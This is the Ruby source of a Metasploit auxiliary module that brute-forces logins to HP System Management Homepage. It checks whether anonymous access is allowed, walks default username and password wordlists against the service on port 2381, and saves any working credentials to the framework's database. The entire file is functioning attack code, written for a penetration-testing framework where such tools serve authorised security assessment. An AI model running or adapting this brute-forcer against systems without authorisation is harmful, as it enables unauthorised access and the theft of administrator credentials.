##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

#load "/Users/wchen/rapid7/msf/lib/metasploit/framework/login_scanner/smh.rb"

require 'msf/core'
require 'metasploit/framework/login_scanner/smh'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => "HP System Management Homepage Login Utility",
      'Description'    => %q{
        This module attempts to login to HP System Management Homepage using host
        operating system authentication.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'sinn3r' ],
      'DefaultOptions' =>
        {
          'SSL' => true,
          'RPORT' => 2381,
          'USERPASS_FILE' => File.join(Msf::Config.data_directory, "wordlists", "http_default_userpass.txt"),
          'USER_FILE' => File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt"),
          'PASS_FILE' => File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt")
        }
    ))
  end

  def anonymous_access?
    res = send_request_raw({'uri' => '/'})
    return true if res and res.body =~ /username = "hpsmh_anonymous"/
    false
  end

  def init_loginscanner(ip)
    @cred_collection = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file:       datastore['PASS_FILE'],
      password:        datastore['PASSWORD'],
      user_file:       datastore['USER_FILE'],
      userpass_file:   datastore['USERPASS_FILE'],
      username:        datastore['USERNAME'],
      user_as_pass:    datastore['USER_AS_PASS']
    )

    @scanner = Metasploit::Framework::LoginScanner::Smh.new(
      host:               ip,
      port:               rport,
      uri:                datastore['URI'],
      proxies:            datastore["PROXIES"],
      cred_details:       @cred_collection,
      stop_on_success:    datastore['STOP_ON_SUCCESS'],
      connection_timeout: 5
    )

    @scanner.ssl         = datastore['SSL']
    @scanner.ssl_version = datastore['SSLVERSION']
  end

 def do_report(ip, port, result)
    service_data = {
      address: ip,
      port: port,
      service_name: 'http',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: self.fullname,
      origin_type: :service,
      private_data: result.credential.private,
      private_type: :password,
      username: result.credential.public,
    }.merge(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      last_attempted_at: DateTime.now,
      status: result.status
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def bruteforce(ip)
    @scanner.scan! do |result|
      case result.status
      when Metasploit::Model::Login::Status::SUCCESSFUL
        print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}'"
        do_report(ip, rport, result)
        :next_user
      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
        invalidate_login(
            address: ip,
            port: rport,
            protocol: 'tcp',
            public: result.credential.public,
            private: result.credential.private,
            realm_key: result.credential.realm_key,
            realm_value: result.credential.realm,
            status: result.status
        )
        :abort
      when Metasploit::Model::Login::Status::INCORRECT
        print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
        invalidate_login(
            address: ip,
            port: rport,
            protocol: 'tcp',
            public: result.credential.public,
            private: result.credential.private,
            realm_key: result.credential.realm_key,
            realm_value: result.credential.realm,
            status: result.status
        )
      end
    end
  end


  def run_host(ip)
    if anonymous_access?
      print_status("#{peer} - No login necessary. Server allows anonymous access.")
      return
    end

    init_loginscanner(ip)
    bruteforce(ip)
  end
end

